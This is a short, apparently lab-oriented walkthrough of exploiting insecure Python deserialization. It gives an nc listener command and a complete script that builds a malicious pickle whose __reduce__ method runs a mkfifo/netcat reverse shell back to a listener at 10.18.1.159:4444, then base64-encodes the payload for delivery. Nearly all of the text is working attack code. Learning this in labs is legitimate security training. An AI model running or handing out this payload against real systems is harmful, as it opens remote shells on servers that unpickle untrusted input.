# Insecure Deserialization - Code Execution

1. on local machine

Run nc listener

```sh
nc -lvnp 4444
```

Edit the python script with your VPN IP

```python
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.18.1.159 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

Run python script and get the base64 command.
